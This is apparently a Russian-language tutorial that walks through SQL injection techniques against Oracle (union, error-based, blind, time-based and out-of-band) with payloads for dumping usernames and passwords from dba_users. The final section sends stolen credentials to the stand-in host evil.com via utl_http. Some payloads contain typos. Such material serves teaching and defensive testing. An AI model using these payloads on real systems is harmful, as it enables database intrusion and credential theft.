# SQL-инъекции

## Union SQL-инъекции

Данная техника строится на использовании оператора `UNION`. Этот оператор позволяет объединить вывод нескольких `SELECT` запросов. Однако, _**важный момент — количество и тип аргументов должны быть одинаковыми у каждого `SELECT` запроса**_. В противном случае или страница будет отображена некорректно, или будет выведено сообщение об ошибке.

Сначала для проведения данной атаки нужно определить количество аргументов в SQL запросе. Делается это перебором — с помощью оператора `ORDER BY`.

Выглядит это примерно так:
```sql
-- запрос выполнен
' ORDER BY 1 --
-- запрос выполнен
' ORDER BY 2 --
-- запрос выполнен
' ORDER BY 3 --
-- возникло исключение
' ORDER BY 4 --
```
То есть мы берём то значение, на котором произошла ошибка, и отнимаем один. Значит аргументов 3.
Далее нужно определить тип аргументов, а именно у каких из них задан параметр `NOT NULL` (то есть не могут быть нулевыми) и какой у таких аргументов тип:

```sql
-- возникло исключение
UNION SELECT 'test', null, null FROM dual --
-- запрос выполнен
UNION SELECT null, 'test', null FROM dual --
```

В данном случае повезло сразу попасть на нужный тип. Если бы выдало исключение, мы бы пробовали числовые и даты.
Мы определили число аргументов, какие из них не нулевые (NOT NULL) и тип данных аргументов. Теперь мы можем сконструировать запрос:

```sql
' UNION SELECT null, (SELECT username || '--' || password
FROM dba_users WHERE username = 'SYS'), null FROM dual --
```

Что мы видим? С UNION понятно, он нужен чтобы объединить несколько запросов. Далее у нас null, нулевой аргумент, мы его определили до этого.
Далее запрос. Из таблицы dba_users мы просим выдать нам столбцы username и password, причём только те, где username = ‘SYS’. Но почему мы используем || ‘--’ ||? Таким образом в результате запроса нам выдаст не слепленную друг с другом комбинацию логинов и паролей типа adminpassword, а admin—password. Согласитесь, так намного удобнее.

Почему пользователь SYS? Это админский пользователь в Oracle. Перейдём к более интересной категории атак.

## Error-based SQL-инъекции

Данная техника используется, когда сообщение о возникшем исключении (ошибке) выводится пользователю и есть факт некорректной обработки исключений. Тут уже многое зависит от того о какой СУБД мы говорим: MySQL, Oracle или других, так как техники по большей части индивидуальны. Для демонстрации представим, _**что у нас СУБД Oracle**_.

В нашем случае мы воспользуемся одной из уязвимых функций — `ctxsys.drithsx.sn()`.
Вот пример кода, который покажет нам две первые строки из таблицы с помощью сообщения об исключении:

```sql
-- извлечение первой строки из dba_users
' AND 1=ctxsys.drithsx.sn(1,(SELECT cred FROM (SELECT
username || '--' || password cred, rownum FROM dba_users)
WHERE rn= 1)) -
-- извлечение второй строки из dba_users
' AND 1=ctxsys.drithsx.sn(1,(SELECT cred FROM (SELECT
username || '--' || password cred, rownum FROM dba_users)
WHERE rn= 2)) -
```

## Blind SQL-инъекция

Если нет возможности использования Union и Error-инъекций, однако есть какая-либо возможность влиять на логику работы приложения, можно использовать Blind SQL-инъекции.

При проведении Blind-инъекции составляется выражение, которое при истинном значении не нарушает логику работы. Неправильное же поведение вызывает ошибку в работе приложения и страницы. То есть это своего рода логический перебор, выражения с ответом да/нет или же попытка угадать какое-то значение.

Например, как будет выглядеть слепая инъекция, цель которой узнать, есть ли у пользователя роль DBA:

```sql
-- если страница корректно отобразилась, пользователю назначена роль DBA
Product 1' AND NVL((SELECT LENGTH(username) FROM
user_role_privs WHERE granted_role = 'DBA'),0) != 0 --
```

## Time-based SQL-инъекции

Схожа с Blind SQL по своей сути. Если запрос правильный — ответ будет несколько секунд приходить к нам, если нет — отклик почти мгновенный. С помощью данной техники мы можем как проверить какое-либо логическое условие(например, наличие роли), так и, например, посимвольно извлечь данные из таблиц.

```sql
-- извлечение первого символа
Product 1 AND 0!=(select decode(substr(user,1,1),'A',
(select count(*) from all_objects, all_objects),0) from dual) --
Product 1' AND 0!=(select decode(substr(user,1,1'),'B',
(select count(*) from all_objects, all_objects),0) from dual) --
```

## Out-bound SQL-инъекция

Out-bound-инъекция используется в случае, если всё остальное не помогает. Для этого нам понадобится удалённый сервер либо доступ к директории на сервере с БД. Смысл в том, что мы направляем вывод SQL-запроса на наш сервер (обычно с помощью протоколов DNS, HTTP или SMTP). Также возможен вариант, когда мы вывод запроса записываем в файл в директории СУБД. Для выполнения данных манипуляций нам понадобится пакет url_http.

```sql
-- результата выполнения запроса передается на http://evil.com
' AND 1=SELECT SUM(LENGTH(utl_http.request('http://ev?
il.com/'||username||"--"||password)) FROM dba.users -
```
